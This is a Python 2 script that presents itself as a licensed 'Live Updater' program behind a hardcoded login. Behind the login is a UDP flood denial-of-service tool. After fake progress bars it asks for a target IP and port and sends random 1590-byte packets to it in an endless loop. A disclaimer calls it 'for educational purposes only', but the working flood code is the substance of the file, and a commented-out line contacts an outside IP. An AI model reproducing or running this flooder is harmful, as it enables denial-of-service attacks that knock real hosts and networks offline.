#!/usr/bin/python
# Just a note, I didn't make this
# I'm providing versioning + updates + licenses + DRM for these programs.
import sys
import os
import time
import socket
import random
import urllib2
####################
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
hostname = os.system("scutil --get HostName")
####################


##################
user = ("live")
password = ("updater")
##################


##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1590)
#############

os.system("clear")
time.sleep(5)
print "###########################"
print "Made By:        Zeek Bailey"
print "###########################"
print "This program is for \n educational purposes only. Zeek is not responsible for any damages assicioated with this product."
print "###########################"
print "License:       Live Updater"
print "###########################"
print "This program was packed and encrypted by Noah Wooten."
print "###########################"
print "Version:             v1.2.0"
print "###########################"
time.sleep(5)
os.system("clear")

u = raw_input(str("Whats your username? "))
if u == (user):

    os.system("clear")

    p = raw_input(str("Whats your password? "))
    if p == (password):
      #  security = urllib2.urlopen("107.211.98.96/py/authorization.xa&"+user+"&"+password+"@").read()
        os.system("clear")
        time.sleep(0.5)

        print ("Hello " + u)
        time.sleep(2)

        os.system("clear")
        time.sleep(0.5)

        print ("Please wait.")
        time.sleep(1)
        os.system("clear")

        print "Please wait..."
        time.sleep(0.5)

        os.system("clear")

        print "Please wait...."
        time.sleep(0.5)

        os.system("clear")

        print "Please wait....."
        time.sleep(0.5)

        os.system("clear")

        print "Please wait......"
        time.sleep(0.5)

        os.system("clear")
       # os.system("figlet Attack ATTACK")

        print "Please wait......."
        time.sleep(0.5)

        os.system("clear")

        print "Please wait........"
        time.sleep(0.5)

        os.system("clear")

        print "Please wait........."
        time.sleep(0.5)

        os.system("clear")

        print "Please wait.........."
        time.sleep(0.5)

        os.system("clear")

        print "Please wait..........."
        time.sleep(0.5)

        os.system("clear")


        print "Please wait............"
        time.sleep(0.5)

        os.system("clear")


        print "Please wait............."
        time.sleep(0.5)

        os.system("clear")

        print "Please wait............."
        time.sleep(5)

        os.system("clear")

        print "Please wait.............."
        time.sleep(0.5)

        os.system("clear")

        print "Welcome.."
        time.sleep(0.5)

        os.system("clear")

        print "Welcome..."
        time.sleep(0.5)

        os.system("clear")

        print "Welcome."
        time.sleep(0.5)

        os.system("clear")

        print "Welcome.."
        time.sleep(0.5)

        os.system("clear")

        print "Welcome..."
        time.sleep(1)

        os.system("clear")

        ip = raw_input("IP Target : ")
        port = input("Port       : ")

        os.system("clear")
        time.sleep(1)
        print
        print "[--------------------] 0% "
        time.sleep(5)
        print "[##########----------] 50%"
        time.sleep(5)
        print "[####################] 100%"
        time.sleep(0.5)
        sent = 0
        while True:
            time.sleep(0.001)
            sock.sendto(bytes, (ip , port))
            sent = sent + 1
            print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
            if port == 65534:
               port = 1
        else:
            print ("Incorrect Password.")
    else:
        print ("Username incorrect.")